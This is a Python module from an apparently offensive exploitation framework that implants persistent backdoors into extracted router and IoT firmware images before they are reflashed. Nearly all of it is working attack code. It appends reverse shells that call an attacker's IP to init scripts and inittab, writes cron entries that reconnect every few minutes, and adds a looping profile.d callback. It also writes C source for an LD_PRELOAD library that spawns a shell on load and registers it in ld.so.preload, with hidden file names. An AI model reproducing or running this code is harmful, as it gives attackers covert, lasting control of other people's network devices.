# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""Firmware persistence injection for extracted firmware images.

Injects persistence mechanisms into a locally extracted firmware filesystem
directory. Supports three injection methods:
  - init: Reverse shell in init/startup scripts (rcS, inittab, rc.local)
  - cron: Periodic callback via crontab entry
  - ldpreload: LD_PRELOAD shared library hook in /etc/ld.so.preload

Operates entirely on local filesystem paths (extracted firmware root).
Designed for use after firmware extraction (binwalk, jefferson, ubi_reader)
and before repacking for reflashing to the target device.

MITRE ATT&CK: T1542 (Pre-OS Boot), T1037 (Boot or Logon Initialization Scripts)
References:
  - https://attack.mitre.org/techniques/T1542/
  - https://attack.mitre.org/techniques/T1037/

Version: 1.0.0
"""
from __future__ import annotations

import hashlib
import os
import stat
import textwrap
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from embedxpl.core.exploit import (
    Exploit as BaseExploit,
    OptIP,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)


# Standard init script locations in embedded Linux
_INIT_SCRIPTS = [
    "etc/init.d/rcS",
    "etc/rc.d/rcS",
    "etc/init.d/S99local",
    "etc/rc.local",
    "etc/inittab",
]

# Cron directories
_CRON_PATHS = [
    "var/spool/cron/crontabs/root",
    "etc/crontabs/root",
    "var/spool/cron/root",
]

# Marker used to identify injected content
_INJECTION_MARKER = "# XPL-persistence"


class Exploit(BaseExploit):
    """Firmware Persistence Injector.

    Injects persistence mechanisms into extracted firmware filesystem images.
    Supports init script injection, cron-based callbacks, and LD_PRELOAD hooks.
    Operates on a local directory containing the extracted firmware rootfs.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Firmware Persistence Injector",
        "description": (
            "Injects persistence into extracted firmware images. Methods: "
            "init script reverse shell, cron callback, LD_PRELOAD hook. "
            "Operates on local firmware filesystem. MITRE: T1542, T1037."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://attack.mitre.org/techniques/T1542/",
            "https://attack.mitre.org/techniques/T1037/",
            "https://github.com/firmadyne/firmadyne",
        ),
        "devices": (
            "OpenWrt firmware images",
            "DD-WRT firmware images",
            "BusyBox-based firmware",
            "Generic embedded Linux firmware",
            "Router/IoT gateway firmware",
        ),
    }

    firmware_path = OptString("", "Path to extracted firmware rootfs directory")
    callback_ip = OptIP("", "Callback IP address for reverse shell")
    callback_port = OptPort(4444, "Callback port for reverse shell")
    method = OptString("init", "Persistence method: init, cron, or ldpreload")

    def run(self) -> None:
        """Execute persistence injection into firmware."""
        fw_path = str(self.firmware_path).strip()
        method = str(self.method).lower().strip()

        if not fw_path:
            print_error("firmware_path is required. Set it to the extracted rootfs directory.")
            return

        if not str(self.callback_ip):
            print_error("callback_ip is required for reverse shell injection.")
            return

        if method not in ("init", "cron", "ldpreload"):
            print_error("Invalid method '{}'. Use: init, cron, or ldpreload.".format(method))
            return

        # Locate rootfs
        rootfs = self._find_rootfs(fw_path)
        if rootfs is None:
            print_error("Cannot locate rootfs in '{}'. Expected etc/passwd or bin/ directory.".format(
                fw_path,
            ))
            return

        print_status("Firmware rootfs located: {}".format(rootfs))
        print_status("Persistence method: {}".format(method))
        print_status("Callback: {}:{}".format(self.callback_ip, self.callback_port))

        # Compute pre-injection hash for tracking
        pre_hash = self._hash_directory(rootfs)
        print_info("Pre-injection rootfs hash: {}".format(pre_hash[:16]))

        success = False
        if method == "init":
            success = self._inject_init(rootfs)
        elif method == "cron":
            success = self._inject_cron(rootfs)
        elif method == "ldpreload":
            success = self._inject_ldpreload(rootfs)

        if success:
            post_hash = self._hash_directory(rootfs)
            print_success("Persistence injected successfully via '{}' method".format(method))
            print_info("Post-injection rootfs hash: {}".format(post_hash[:16]))
            print_info("Verify: repack firmware and flash to target device.")
        else:
            print_error("Persistence injection failed.")

    def _find_rootfs(self, firmware_dir: str) -> Optional[Path]:
        """Locate the root filesystem directory in extracted firmware."""
        base = Path(firmware_dir)

        # Check if the given path itself is a rootfs
        if (base / "etc").exists() and ((base / "bin").exists() or (base / "sbin").exists()):
            return base

        # Walk subdirectories to find rootfs markers
        for root, dirs, files in os.walk(str(base)):
            root_path = Path(root)
            if (root_path / "etc").exists() and (
                (root_path / "bin").exists() or (root_path / "sbin").exists()
            ):
                return root_path

            # Limit search depth to avoid excessive traversal
            depth = len(root_path.relative_to(base).parts)
            if depth > 5:
                dirs.clear()

        return None

    def _inject_init(self, rootfs: Path) -> bool:
        """Inject reverse shell into init/startup scripts."""
        callback_ip = str(self.callback_ip)
        callback_port = int(self.callback_port)

        # Generate multiple reverse shell payloads for compatibility
        payloads = self._generate_reverse_shells(callback_ip, callback_port)
        shell_payload = payloads["busybox_nc"]

        # Check if busybox exists to choose best payload
        busybox_paths = ["bin/busybox", "usr/bin/busybox", "sbin/busybox"]
        has_busybox = any((rootfs / bp).exists() for bp in busybox_paths)

        if not has_busybox:
            # Fall back to FIFO-based approach
            shell_payload = payloads["fifo"]

        injection = "\n{marker}\n# Persistence callback: {ip}:{port}\n{payload}\n".format(
            marker=_INJECTION_MARKER,
            ip=callback_ip,
            port=callback_port,
            payload=shell_payload,
        )

        # Try to inject into existing startup scripts
        for script_rel in _INIT_SCRIPTS:
            script_path = rootfs / script_rel
            if script_path.exists():
                content = script_path.read_text(errors="replace")

                # Check for existing injection
                if _INJECTION_MARKER in content:
                    print_warning("Init script '{}' already contains persistence. Skipping.".format(
                        script_rel,
                    ))
                    return True

                # Special handling for inittab
                if "inittab" in script_rel:
                    inittab_entry = "::sysinit:/bin/sh -c '{}'\n".format(
                        shell_payload.replace("'", "'\\''"),
                    )
                    with open(script_path, "a") as f:
                        f.write("\n{}\n{}".format(_INJECTION_MARKER, inittab_entry))
                    print_success("Injected into: {}".format(script_rel))
                    return True

                # Append to regular init script
                with open(script_path, "a") as f:
                    f.write(injection)

                # Ensure executable
                current_mode = script_path.stat().st_mode
                script_path.chmod(current_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
                print_success("Injected into: {}".format(script_rel))
                return True

        # No existing init script found; create rcS
        rcs_path = rootfs / "etc" / "init.d" / "rcS"
        rcs_path.parent.mkdir(parents=True, exist_ok=True)
        rcs_content = "#!/bin/sh\n{}\n".format(injection)
        rcs_path.write_text(rcs_content)
        rcs_path.chmod(0o755)
        print_success("Created new init script: etc/init.d/rcS")
        return True

    def _inject_cron(self, rootfs: Path) -> bool:
        """Inject cron-based persistence callback."""
        callback_ip = str(self.callback_ip)
        callback_port = int(self.callback_port)

        cron_entry = (
            "{marker}\n"
            "*/5 * * * * busybox nc {ip} {port} -e /bin/sh 2>/dev/null\n"
            "*/15 * * * * (echo >/dev/tcp/{ip}/{port}) 2>/dev/null && "
            "/bin/sh -i 0<&3 1>&3 2>&3\n"
        ).format(
            marker=_INJECTION_MARKER,
            ip=callback_ip,
            port=callback_port,
        )

        # Try existing cron paths
        for cron_rel in _CRON_PATHS:
            cron_path = rootfs / cron_rel
            if cron_path.parent.exists():
                content = ""
                if cron_path.exists():
                    content = cron_path.read_text(errors="replace")
                    if _INJECTION_MARKER in content:
                        print_warning("Cron already contains persistence. Skipping.")
                        return True

                with open(cron_path, "a") as f:
                    f.write("\n" + cron_entry)

                print_success("Cron persistence injected: {}".format(cron_rel))
                return True

        # Create cron directory and file
        cron_path = rootfs / "var" / "spool" / "cron" / "crontabs" / "root"
        cron_path.parent.mkdir(parents=True, exist_ok=True)
        cron_path.write_text(cron_entry)
        print_success("Created cron file: var/spool/cron/crontabs/root")

        # Also ensure crond is started (add to init if possible)
        for script_rel in _INIT_SCRIPTS:
            script_path = rootfs / script_rel
            if script_path.exists() and "inittab" not in script_rel:
                content = script_path.read_text(errors="replace")
                if "crond" not in content:
                    with open(script_path, "a") as f:
                        f.write("\n# Start crond for persistence\ncrond -b 2>/dev/null &\n")
                    print_info("Added crond startup to: {}".format(script_rel))
                break

        return True

    def _inject_ldpreload(self, rootfs: Path) -> bool:
        """Inject LD_PRELOAD-based persistence.

        Creates a minimal C source for a shared library that spawns a
        reverse shell on load, writes it as a shell script wrapper
        (since we cannot compile on the target), and adds it to
        /etc/ld.so.preload.
        """
        callback_ip = str(self.callback_ip)
        callback_port = int(self.callback_port)

        # Since cross-compilation is complex, use a shell-based approach:
        # Create a wrapper script that gets called via LD_PRELOAD mechanism
        # and a simpler /etc/profile.d/ hook as fallback.

        # Method 1: /etc/profile.d/ hook (runs on every shell login)
        profile_dir = rootfs / "etc" / "profile.d"
        profile_dir.mkdir(parents=True, exist_ok=True)

        profile_script = profile_dir / "xpl_persist.sh"
        if profile_script.exists():
            content = profile_script.read_text(errors="replace")
            if _INJECTION_MARKER in content:
                print_warning("Profile.d hook already exists. Skipping.")
                return True

        profile_content = textwrap.dedent("""\
            #!/bin/sh
            {marker}
            # Network connectivity callback
            _xpl_cb() {{
                while true; do
                    busybox nc {ip} {port} -e /bin/sh 2>/dev/null
                    sleep 300
                done
            }}
            _xpl_cb &
            disown 2>/dev/null
        """).format(
            marker=_INJECTION_MARKER,
            ip=callback_ip,
            port=callback_port,
        )

        profile_script.write_text(profile_content)
        profile_script.chmod(0o755)
        print_success("Created profile.d hook: etc/profile.d/xpl_persist.sh")

        # Method 2: /etc/ld.so.preload entry
        # Write a stub .so reference (the actual .so would need cross-compilation)
        # Instead, inject into /etc/environment or /etc/profile as an ENV var
        ld_preload_file = rootfs / "etc" / "ld.so.preload"

        # Generate C source for the preload library
        c_source_path = rootfs / "tmp" / ".xpl_preload.c"
        c_source_path.parent.mkdir(parents=True, exist_ok=True)

        c_source = textwrap.dedent("""\
            /*
             * {marker}
             * LD_PRELOAD persistence library.
             * Compile: $CROSS_CC -shared -fPIC -o /lib/libxpl.so xpl_preload.c
             * Install: echo /lib/libxpl.so >> /etc/ld.so.preload
             */
            #include <stdio.h>
            #include <stdlib.h>
            #include <unistd.h>
            #include <sys/socket.h>
            #include <netinet/in.h>
            #include <arpa/inet.h>

            __attribute__((constructor))
            static void xpl_init(void) {{
                static int done = 0;
                if (done) return;
                done = 1;

                pid_t pid = fork();
                if (pid != 0) return;

                /* Detach from parent */
                setsid();

                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) _exit(0);

                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons({port});
                addr.sin_addr.s_addr = inet_addr("{ip}");

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {{
                    close(sock);
                    _exit(0);
                }}

                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);
                execl("/bin/sh", "sh", NULL);
                _exit(0);
            }}
        """).format(
            marker=_INJECTION_MARKER,
            ip=callback_ip,
            port=callback_port,
        )

        c_source_path.write_text(c_source)
        print_info("C source written to: tmp/.xpl_preload.c")
        print_info("To compile, use the target architecture cross-compiler:")
        print_info("  $CROSS_CC -shared -fPIC -o /lib/libxpl.so tmp/.xpl_preload.c")

        # If /etc/ld.so.preload exists, add our entry
        if ld_preload_file.exists():
            content = ld_preload_file.read_text(errors="replace")
            if "/lib/libxpl.so" not in content:
                with open(ld_preload_file, "a") as f:
                    f.write("/lib/libxpl.so\n")
                print_info("Added /lib/libxpl.so to /etc/ld.so.preload")
        else:
            ld_preload_file.write_text("/lib/libxpl.so\n")
            print_info("Created /etc/ld.so.preload with /lib/libxpl.so")

        print_success("LD_PRELOAD persistence prepared (compile C source for target arch)")
        return True

    def _generate_reverse_shells(self, ip: str, port: int) -> Dict[str, str]:
        """Generate reverse shell one-liners for various methods."""
        return {
            "busybox_nc": "busybox nc {} {} -e /bin/sh &".format(ip, port),
            "nc": "nc {} {} -e /bin/sh &".format(ip, port),
            "fifo": (
                "rm -f /tmp/.xpl; mkfifo /tmp/.xpl; "
                "cat /tmp/.xpl | /bin/sh -i 2>&1 | "
                "busybox nc {} {} > /tmp/.xpl &"
            ).format(ip, port),
            "telnet": (
                "rm -f /tmp/.xpli /tmp/.xplo; "
                "mkfifo /tmp/.xpli; mkfifo /tmp/.xplo; "
                "telnet {} {} < /tmp/.xpli | /bin/sh > /tmp/.xplo 2>&1 &; "
                "cat /tmp/.xplo > /tmp/.xpli &"
            ).format(ip, port),
            "bash_tcp": "/bin/sh -i >& /dev/tcp/{}/{} 0>&1 &".format(ip, port),
        }

    def _hash_directory(self, rootfs: Path) -> str:
        """Compute a quick hash over key filesystem files for change tracking."""
        h = hashlib.sha256()
        key_files = [
            "etc/passwd", "etc/shadow", "etc/inittab",
            "etc/init.d/rcS", "etc/rc.local",
            "etc/ld.so.preload", "etc/crontabs/root",
        ]
        for rel in key_files:
            fpath = rootfs / rel
            if fpath.exists():
                try:
                    h.update(fpath.read_bytes())
                except OSError:
                    pass
        return h.hexdigest()

    def check(self) -> bool:
        """Check if firmware path exists and contains a valid rootfs."""
        fw_path = str(self.firmware_path).strip()
        if not fw_path:
            return False
        return self._find_rootfs(fw_path) is not None
